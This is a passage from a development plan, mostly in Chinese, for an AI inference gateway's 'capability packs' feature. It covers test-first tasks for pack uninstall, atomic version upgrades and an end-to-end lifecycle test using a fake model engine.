    prev = uninstaller.preview_uninstall("llm.qwen3-4b")
    assert prev["affected_pools"] == [
        {"pool": "fast", "candidate_id": "c1", "model_name": "qwen3-4b-instruct-2507"}]

async def test_uninstall_without_confirm_409_with_pools(aio_client):
    r = await aio_client.post("/admin/packs/uninstall", json={"pack_id": "llm.qwen3-4b"})
    assert r.status == 409 and (await r.json())["affected_pools"]
async def test_uninstall_confirmed_purges_pool(aio_client):
    r = await aio_client.post("/admin/packs/uninstall",
                              json={"pack_id": "llm.qwen3-4b", "confirmed": True})
    assert r.status == 200
    assert pool_registry_snapshot().candidates_for("fast") == []   # purge 生效
    assert not pack_dir_exists("llm.qwen3-4b")                     # 目录删除
    assert store.get("llm.qwen3-4b") is None                       # 状态移除

def test_uninstall_drain_new_requests_get_503(...):
    # Review Focus 3：disabling_route 后、目录删除前到达的新请求 → 503
    ...

def test_uninstall_does_not_touch_sibling_pack_or_user_models(two_installed_packs):
    uninstall("llm.a")
    assert pack_dir_exists("llm.b") and user_model_yaml_exists()   # 用户模型区不动

def test_uninstall_zero_residue(tmp_path):
    uninstall("llm.a")
    assert list(root.glob("llm.a*")) == [] and list(models_d.glob("pack-llm-a*")) == []
```

- [ ] **Step 2: Run test to verify it fails** — Expected: FAIL
- [ ] **Step 3: Implement `packs/uninstaller.py` + 两个路由**
- [ ] **Step 4: Run test to verify it passes** — PASS + 全套不回归。
- [ ] **Step 5: Commit** — `git commit -m "feat(packs): 卸载状态机/池确认/503/零残留 — PK2"`

---

### Task 11: 升级原子切换

**Files:**
- Modify: `macfabric_gateway/inferfabric/packs/installer.py`（`upgrade(entry) -> InstallResult`）
- Test: `macfabric_gateway/tests/unit/test_packs_upgrade.py`

**Interfaces:**
- Consumes: Task 5/6/7/10 全部
- Produces: `PackInstaller.upgrade(entry)` — 新版本目录走完整事务（含健康检查），全部成功后切换；旧版本目录保留一个回退窗口（常量 `UPGRADE_KEEP_PREVIOUS = 1`：仅保留上一版本，切成功后删除更早版本）；任一阶段失败 → 已装旧版不动、staging 清理

- [ ] **Step 1: Write the failing test**

```python
def test_upgrade_keeps_old_until_new_healthy(...):
    # 新版本健康检查失败 → 旧版本 1.0.0 仍 installed、可服务
def test_upgrade_atomic_switch_and_cleanup(...):
    # 1.0.0 → 1.1.0 成功：current 指向 1.1.0，1.0.0 保留；再升 1.2.0 后 1.0.0 被清理
def test_upgrade_failed_leaves_no_staging(...):
```

- [ ] **Step 2: Run test to verify it fails** — Expected: FAIL — `upgrade` 不存在
- [ ] **Step 3: Implement** — 复用 `install()` 事务，成功后改 `current` 指针（`state.json` 记录 `current_version`），清理超额旧目录。
- [ ] **Step 4: Run test to verify it passes** — PASS + 全套不回归。
- [ ] **Step 5: Commit** — `git commit -m "feat(packs): 升级原子切换与旧版回退窗口 — PK2"`

---

### Task 12: 端到端假引擎验收 + 首批 Catalog 冻结

**Files:**
- Create: `macfabric_gateway/tests/unit/fixtures/fake_pack_engine.py`（最小 OpenAI 兼容假引擎：`/health` 200 + `/v1/chat/completions` 固定回复，stdin 参数收端口与模型路径）
- Create: `macfabric_gateway/tests/unit/test_packs_e2e_fake.py`
- Modify: `macfabric_gateway/packs_catalog.yaml`（Qwen3-4B-Instruct-2507 条目：冻结真实下载源 URL 与 sha256 — 须实际下载一次取 hash；其余 4 项同批冻结；Gemma 确认不在目录中）
- Modify: `docs/superpowers/specs/2026-11-15-capability-packs-design.md` §14（SBPL 探测在本机的实测结果取证行）

**Interfaces:**
- Consumes: 全部前置任务
- Produces: PK3 门禁证据 — 假引擎包全链路：install → `list_models()` 可发现 → 按 `on_demand` 首次调用拉起假引擎 → healthcheck → chat 回复 → sleep → uninstall 零残留

- [ ] **Step 1: Write the failing e2e test**

```python
def test_fake_pack_full_lifecycle(tmp_path, aio_client):
    install via API → status installed
    POST /v1/chat/completions（pack 模型名）→ 200 假回复（首次调用按需拉起）
    POST /admin/packs/uninstall confirmed → removed
    断言零残留 + 其他模型（现网关既存模型 stub）不受影响
```

- [ ] **Step 2: Run test to verify it fails** — Expected: FAIL（缺 fixture 或链路断点）
- [ ] **Step 3: 实现假引擎 fixture + 修补链路断点**；冻结首批 5 项 Catalog 真实 source/sha256（实际下载取 hash，来源页面记录进 CatalogEntry `source_url`）；macOS Vision 条目 `builtin: true` 走"系统内置/无需安装"状态显示。
- [ ] **Step 4: Run test to verify it passes** — PASS + **全套测试 + 已有 125 用例全绿**。
- [ ] **Step 5: Commit** — `git commit -m "feat(packs): 假引擎端到端验收 + 首批 Catalog 冻结 — PK3 门禁"`

---

## 交付边界与后续

- 本计划交付网关侧 PK0–PK3 门禁；**App 能力包页（PK4，SwiftUI）与真实 Qwen3-4B 包全链路实测（PK3 真包验收）另出后续计划**，以本计划冻结的 HTTP 契约为接口。
- PK5 批次（VL/ASR/TTS/Embedding 新运行时模板）不在本计划内 — 每种运行时独立验证后逐个立项。
- SBPL 注入的真实实现（`SandboxProvider` 非 Noop 分支）在 PK3 后按探测实测结果立项；本计划只冻结探测与降级准入。
